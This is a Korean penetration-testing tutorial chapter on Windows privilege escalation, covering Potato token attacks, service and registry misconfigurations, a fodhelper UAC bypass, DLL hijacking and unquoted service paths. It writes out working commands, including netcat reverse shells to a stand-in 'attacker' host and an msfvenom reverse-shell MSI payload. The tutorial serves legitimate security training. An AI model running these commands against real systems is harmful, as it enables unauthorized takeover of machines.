# 권한 상승 — 윈도우

**이전**: [12. 권한 상승 — 리눅스](./12_Privilege_Escalation_Linux.md) | **다음**: [14. Active Directory 공격](./14_Active_Directory.md)

---

Windows 권한 상승(privilege escalation)은 Linux와 비교하여 고유한 도전과 기회를 제시한다. 복잡한 권한 시스템, 서비스 아키텍처, 레지스트리 기반 구성을 갖춘 Windows 보안 모델은 침투 테스터가 체계적으로 이해하고 열거해야 하는 수많은 상승 벡터를 제공한다.

> **중요**: 소유하거나 명시적으로 테스트 권한을 부여받은 시스템에서만 실습해야 한다.

**난이도**: ⭐⭐⭐⭐

## 학습 목표

1. Windows 액세스 토큰과 권한 모델을 이해한다
2. 토큰 사칭(token impersonation) 취약점(SeImpersonate)을 익스플로잇한다
3. 취약한 Windows 서비스를 식별하고 익스플로잇한다
4. UAC(User Account Control)를 우회한다
5. DLL 검색 순서 하이재킹(DLL search order hijacking)을 익스플로잇한다
6. 따옴표 없는 서비스 경로(unquoted service path)를 찾아 익스플로잇한다
7. WinPEAS 및 기타 열거 도구를 효과적으로 사용한다
8. 여러 약점을 체이닝하여 SYSTEM 접근 권한을 얻는다

---

## 목차

1. [Windows 권한 모델](#1-windows-권한-모델)
2. [토큰 사칭 (Potato 공격)](#2-토큰-사칭-potato-공격)
3. [서비스 익스플로잇](#3-서비스-익스플로잇)
4. [UAC 우회 기법](#4-uac-우회-기법)
5. [DLL 하이재킹](#5-dll-하이재킹)
6. [따옴표 없는 서비스 경로](#6-따옴표-없는-서비스-경로)
7. [AlwaysInstallElevated](#7-alwaysinstallelevated)
8. [레지스트리 자동 실행](#8-레지스트리-자동-실행)
9. [예약된 작업](#9-예약된-작업)
10. [Windows 열거 자동화](#10-windows-열거-자동화)
11. [연습 문제](#11-연습-문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. Windows 권한 모델

### 1.1 액세스 토큰과 권한

Windows는 액세스 토큰(access token)을 사용하여 사용자 신원과 권한을 추적한다. 상승에 핵심적인 권한:

| 권한 | 설명 | 익스플로잇 방법 |
|-----------|-------------|-------------|
| SeImpersonatePrivilege | 클라이언트 토큰 사칭 | Potato 공격 |
| SeAssignPrimaryTokenPrivilege | 프로세스 토큰 할당 | 토큰 조작 |
| SeBackupPrivilege | 모든 파일 읽기 | SAM/SYSTEM 추출 |
| SeRestorePrivilege | 모든 파일 쓰기 | DLL 하이재킹 |
| SeDebugPrivilege | 모든 프로세스 디버그 | 프로세스 인젝션 |
| SeTakeOwnershipPrivilege | 파일 소유권 취득 | ACL 조작 |
| SeLoadDriverPrivilege | 커널 드라이버 로드 | 드라이버 익스플로잇 |

### 1.2 열거 명령어

```powershell
# Current user and privileges
whoami /all
whoami /priv

# System information
systeminfo
hostname

# Users and groups
net user
net localgroup administrators

# Running services
sc query state= all
wmic service list full

# Installed patches
wmic qfe list

# Network information
ipconfig /all
netstat -ano
```

---

## 2. 토큰 사칭 (Potato 공격)

서비스 계정이 SeImpersonatePrivilege를 가지고 있으면, SYSTEM 토큰을 사칭할 수 있다.

### 2.1 Potato 패밀리

| 도구 | 기법 | 대상 |
|------|-----------|--------|
| JuicyPotato | COM 서버 사칭 | Windows Server 2008-2016 |
| RoguePotato | 원격 DCOM 활성화 | Windows 10/Server 2019 |
| PrintSpoofer | 프린트 스풀러 사칭 | Windows 10/Server 2016-2019 |
| GodPotato | 다중 기법 | 광범위한 커버리지 |
| SweetPotato | 결합 기법 | 최신 Windows |

```bash
# PrintSpoofer (if SeImpersonatePrivilege available)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -i -c "C:\temp\nc.exe attacker 4444 -e cmd"

# JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe attacker 4444 -e cmd" -t *
```

---

## 3. 서비스 익스플로잇

### 3.1 불안전한 서비스 권한

```powershell
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If we can modify a service:
sc config <service> binpath= "C:\temp\payload.exe"
sc stop <service>
sc start <service>
```

### 3.2 취약한 서비스 바이너리 권한

```powershell
# Check permissions on service binary
icacls "C:\path\to\service.exe"

# If writable, replace with payload
move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
copy "C:\temp\payload.exe" "C:\path\to\service.exe"
sc stop <service> && sc start <service>
```

---

## 4. UAC 우회 기법

UAC(User Account Control)는 관리자 확인을 위한 프롬프트를 표시한다. 우회 기법:

```powershell
# Check UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# fodhelper.exe bypass (Windows 10)
# Set registry key then launch fodhelper
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
fodhelper.exe

# UACME tool — collection of 70+ bypass methods
# https://github.com/hfiref0x/UACME
```

---

## 5. DLL 하이재킹

Windows DLL 검색 순서(search order)는 프로그램이 쓰기 가능한 위치에서 DLL을 로드할 때 익스플로잇할 수 있다:

```
DLL Search Order:
1. Directory of the executable
2. System directory (C:\Windows\System32)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories
```

더 높은 우선순위의 디렉터리에 악성 DLL을 배치할 수 있다면:

```python
"""
DLL hijacking detection module.

Identifies potential DLL hijacking opportunities
by analyzing process DLL loading behavior.
"""

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class DLLHijackOpportunity:
    """A potential DLL hijacking target."""
    process: str
    dll_name: str
    search_path: str
    writable: bool
    severity: str

    def report(self) -> str:
        return (
            f"[{self.severity}] {self.process} loads {self.dll_name}\n"
            f"  Search path: {self.search_path}\n"
            f"  Writable: {self.writable}"
        )


# Common DLL hijacking targets
KNOWN_HIJACK_DLLS = [
    ("chrome.exe", "wer.dll"),
    ("explorer.exe", "cscapi.dll"),
    ("OneDrive.exe", "secur32.dll"),
    ("Teams.exe", "dbghelp.dll"),
]


if __name__ == "__main__":
    print("DLL Hijacking Detection")
    print("=" * 40)
    print("Use Process Monitor (ProcMon) to find:")
    print("  Filter: Result = NAME NOT FOUND")
    print("  Filter: Path ends with .dll")
    print("\nLook for DLLs loaded from writable directories.")
```

---

## 6. 따옴표 없는 서비스 경로

Windows는 따옴표 없는 경로의 공백을 잠재적 파일명 경계로 처리한다:

```
# Unquoted path:
C:\Program Files\My App\service.exe

# Windows tries in order:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe

# If we can write to C:\Program Files\My.exe, we get execution
```

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

---

## 7. AlwaysInstallElevated

두 레지스트리 키가 모두 1로 설정되어 있으면, 모든 MSI 패키지가 SYSTEM 권한으로 설치된다:

```powershell
# Check setting
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi > payload.msi
msiexec /quiet /qn /i payload.msi
```

---

## 8. 레지스트리 자동 실행

자동 실행(autorun) 레지스트리 키에 있는 프로그램은 로그인 시 실행된다:

```powershell
# Check autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If an autorun binary is writable:
# Replace it with payload, wait for next login
```

---

## 9. 예약된 작업

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check permissions on task binaries
icacls "C:\path\to\task.exe"

# If binary is writable, replace and wait for execution
```

---

## 10. Windows 열거 자동화

| 도구 | 설명 | 사용법 |
|------|-------------|-------|
| WinPEAS | 포괄적인 Windows 열거 | `winpeas.exe` |
| PowerUp | PowerShell 권한 상승 검사 | `Invoke-AllChecks` |
| Seatbelt | .NET 보안 중심 열거 | `Seatbelt.exe -group=all` |
| SharpUp | .NET 기반 PowerUp 포트 | `SharpUp.exe` |
| PrivescCheck | PowerShell 권한 상승 감사기 | `Invoke-PrivescCheck` |
| Watson | .NET 미적용 패치 검색 | `Watson.exe` |

---

## 11. 연습 문제

1. **열거**: 취약한 Windows VM에서 WinPEAS를 실행하고 모든 상승 벡터를 식별한다.
2. **토큰 사칭**: 서비스 계정에서 PrintSpoofer를 사용하여 SeImpersonatePrivilege를 익스플로잇한다.
3. **서비스 남용**: 취약한 권한을 가진 서비스를 찾아 익스플로잇한다.
4. **UAC 우회**: Windows 10에서 fodhelper 기법을 사용하여 UAC를 우회한다.
5. **DLL 하이재킹**: Process Monitor를 사용하여 DLL 하이재킹 기회를 찾고 익스플로잇한다.
6. **전체 체인**: HTB/THM Windows 머신에서 초기 발판부터 SYSTEM까지 완료한다.

---

## 12. 요약

Windows 권한 상승은 Windows 보안 모델의 이해를 필요로 한다:

- **토큰 사칭**(Potato 공격)은 SeImpersonatePrivilege를 익스플로잇한다
- **서비스 설정 오류**는 다양한 상승 경로를 제공한다
- **UAC 우회**는 권한 상승 프롬프트를 회피한다
- **DLL 하이재킹**은 DLL 검색 순서를 익스플로잇한다
- **따옴표 없는 서비스 경로**는 Windows 경로 파싱을 속인다
- **레지스트리 설정**(AlwaysInstallElevated 등)은 MSI에 SYSTEM 권한을 부여한다
- **자동화 도구**(WinPEAS, PowerUp)는 열거를 가속화한다

---

## 13. 참고 자료

- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings Windows PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS: https://lolbas-project.github.io/
- WinPEAS: https://github.com/carlospolop/PEASS-ng
- UACME: https://github.com/hfiref0x/UACME
